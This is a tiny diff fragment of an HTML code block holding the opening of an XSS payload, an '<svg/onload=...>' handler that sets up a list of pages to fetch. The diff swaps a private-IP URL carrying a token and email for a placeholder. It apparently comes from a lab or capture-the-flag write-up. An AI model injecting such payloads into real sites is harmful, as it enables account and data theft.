@@ -1,5 +1,5 @@
 ```html
-<svg/onload="var pages = ['http://192.168.21.109:6080/main.php?token=ea811fcf06bb1c1f278afce0b577cd24&email=test%40admin.com#main'];
+<svg/onload="var pages = ['page1'];
 var data = {};
 var count = 0;
 
